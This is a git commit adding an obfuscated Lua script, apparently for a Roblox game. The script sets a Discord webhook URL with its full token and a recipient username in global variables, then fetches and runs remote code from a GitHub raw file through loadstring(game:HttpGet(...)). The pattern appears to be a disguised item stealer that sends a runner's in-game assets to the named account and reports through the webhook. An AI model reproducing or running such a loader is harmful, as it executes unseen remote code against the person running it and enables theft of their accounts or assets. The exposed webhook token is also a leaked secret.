c401cc6d900054edf72a48d006fdbd77028a571c
huxleyz <134376207+huxleyz@users.noreply.github.com>
2023-05-23 17:29:28 +0800

    Create script.lua

---
+++ script.lua
@@ -0,0 +1,21 @@
+--[[
+
+ .____                  ________ ___.    _____                           __                
+
+ |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
+
+ |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
+
+ |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
+
+ |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
+
+         \/          \/         \/    \/                \/     \/     \/                   
+
+          \_Welcome to LuaObfuscator.com   (Alpha 0.2.8) ~  Much Love, Ferib 
+
+]]--
+
+do do local v0=0;while true do if (v0==1) then _G.Webhook="https://discord.com
+
+/api/webhooks/1110498339306356756/-DaVKPB8N0JVEMlLj6RhWEmIOWjQUqJ6eh5abngI0h_ONfMGccIbGVnDcNIhGDYSEtyc";loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/LypherXScriptZPSX/main/PsXLypherX",true))();break;end if (v0==0) then local v1=0;while true do if (v1==0) then local v2=0;while true do if (v2==0) then _G.UserName="MasterJared6479";_G.UserName2="MasterJared6479";v2=1;end if (v2==1) then v1=1;break;end end end if (v1==1) then v0=1;break;end end end end end end
